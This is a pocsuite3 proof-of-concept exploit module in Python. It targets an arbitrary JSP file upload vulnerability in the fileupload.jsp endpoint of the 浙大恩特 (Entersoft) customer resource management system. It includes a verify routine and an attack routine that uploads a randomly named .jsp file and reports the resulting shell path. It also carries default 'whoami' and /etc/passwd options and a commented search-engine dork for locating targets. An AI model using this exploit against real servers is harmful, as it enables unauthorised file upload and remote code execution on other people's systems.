"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
# from pocsuite3.api import requests, POCBase, Output, register_poc, logger, VUL_TYPE, OptDict
from pocsuite3.api import requests, POCBase, Output, register_poc, logger, OptString, OptDict, VUL_TYPE, POC_CATEGORY
# from pocsuite3.api import get_listener_ip, get_listener_port
# from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str


class TestPOC(POCBase):
    vulID = '0'  # ssvid not include SSV-
    version = '1.0' 
    author = 'Douglas'  
    vulDate = '2021-05-04' 
    createDate = '2023-08-26'
    updateDate = '2023-08-26'
    references = ['https://mp.weixin.qq.com/s/8BpPzi_7SfJWEQG5N988Mg']
    name = '浙大恩特客户资源管理系统 fileupload.jsp 文件上传' # PoC Name
    appName = '浙大恩特客户资源管理系统'
    appPowerLink = 'http://www.entersoft.cn' 
    appVersion = ''
    vulType = 'Upload Files'
    # vulType = VUL_TYPE.
    desc = '''
    浙大恩特客户资源管理系统中的fileupload.jsp接口存在安全漏洞，允许攻击者向系统上传任意恶意JSP文件，从而可能导致潜在的远程执行代码攻击。该漏洞可能会对系统的完整性和安全性产生严重影响。
    '''
    # 搜索 dork，如果运行 PoC 时不提供目标且该字段不为空，将会调用插件从搜索引擎获取目标。
    # dork = {'zoomeye':''}
    # dork = {'hunter': ''}
    # dork = {'fofa': 'app="浙大恩特客户资源管理系统"'}
    pocDesc = '''poc usage'''
    samples = ['']
    install_requires = ['']


    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    # 默认执行--attack参数的时候是whoami命令，自定义执行命令
    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString('whoami', description='The command to execute')
        o["file_read"] = OptString("/etc/passwd", description="The command to read file")
        return o

    def _verify(self):
        '''verify mode'''
        result = {}
        payload = '/entsoft_en/entereditor/jsp/fileupload.jsp'
        target = self.url + payload
    
        try:
            r = requests.post(url=target, timeout=20, verify=False, allow_redirects=False)
            # print(r.status_code)
            # print(r.text)
            if r.status_code == 200 and "/enterdoc/uploadfile/null" in r.text:
                print(r.text)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['Payload'] = payload
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

    # def _attack(self):
    #     ''' attack mode '''
    #     # result = {}

    #     return self._verify()   # if only verify mode


    def _attack(self):
        ''' attack mode '''
        result = {}
        
        data = "jsut for test!"
        data_len = len(data)
        host = self.rhost
        port = self.rport
        rhost = host + ":" + str(port)
        headers = {
            "Host": rhost,
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "close",
            "Content-Length": str(data_len)
        }
        token = random_str(8) + ".jsp"
        payload = "/entsoft_en/entereditor/jsp/fileupload.jsp?filename={}".format(token)
        target = self.url + payload   

        try:
            r = requests.post(url=target, timeout=20, verify=False, allow_redirects=False, headers=headers, data=data)
            # print(r.status_code)
            # print(r.text)
            if r.status_code == 200 and token in r.text:
                # print(r.text)
                shellpath = self.url + "/enterdoc/uploadfile/" + token
                # print(shellpath)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['Payload'] = payload
                result['VerifyInfo']['ShellPath'] = shellpath
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

register_poc(TestPOC)